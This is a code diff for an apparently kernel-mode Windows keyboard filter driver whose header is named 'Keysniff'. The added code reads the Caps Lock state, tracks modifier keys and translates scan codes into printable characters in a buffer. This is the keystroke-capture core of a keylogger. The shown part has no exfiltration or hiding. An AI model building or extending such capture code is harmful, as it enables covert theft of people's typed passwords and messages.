@@ -4,6 +4,7 @@ extern "C" {
 #include "Keysniff.H"
 #include "KbdHook.h"
 #include "ntddkbd.h"
+#include "ScanCode.H"
 
 #define INVALID 0X00
 #define SPACE 0X01
@@ -200,12 +201,53 @@ void ConvertScanCodeToKeyCode(PDEVICE_EXTENSION pDevExt, KEY_DATA* kData, char* 
 
 	if (status == STATUS_PENDING)
 	{
-		(VOID)KeWaitForSingleObject(&event, Suspended, KernelMode,
-			FALSE, NULL);
+		(VOID)KeWaitForSingleObject(&event, Suspended, KernelMode, FALSE, NULL);
 	}
 
 
 	status = irp->IoStatus.Status;
 
+	if (status == STATUS_SUCCESS) {
+		indParams = *(PKEYBOARD_INDICATOR_PARAMETERS)irp->AssociatedIrp.SystemBuffer;
+		if (irp) {
+			int flag = (indParams.LedFlags & KEYBOARD_CAPS_LOCK_ON);
+			DbgPrint("Caps Lock Indicator Status: %x.\n", flag);
+		}
+		else DbgPrint("Error allocating Irp");
+	}
 
+	switch (key) {
+	case LSHIFT:
+		if (kData->KeyFlags == KEY_MAKE) pDevExt->kState.kSHIFT = true;
+		else pDevExt->kState.kSHIFT = false;
+		break;
+
+	case RSHIFT:
+		if (kData->KeyFlags == KEY_MAKE) pDevExt->kState.kSHIFT = true;
+		else pDevExt->kState.kSHIFT = false;
+		break;
+
+	case CTRL:
+		if (kData->KeyFlags == KEY_MAKE) pDevExt->kState.kCTRL = true;
+		else pDevExt->kState.kCTRL = false;
+		break;
+
+	case ALT:
+		if (kData->KeyFlags == KEY_MAKE) pDevExt->kState.kALT = true;
+		else pDevExt->kState.kALT = false;
+		break;
+
+	case SPACE:
+		if ((pDevExt->kState.kALT != true) && (kData->KeyFlags == KEY_BREAK)) keys[0] = 0x20;
+		break;
+
+	default:
+		if ((pDevExt->kState.kALT != true) && (pDevExt->kState.kCTRL != true) && (kData->KeyFlags == KEY_BREAK)) {
+			if ((key >= 0x21) && (key <= 0x7E)) {
+				if (pDevExt->kState.kSHIFT == true) keys[0] = ExtendedKeyMap[kData->KeyData];
+				else keys[0] = key;
+			}
+		}
+		break;
+	}
 }
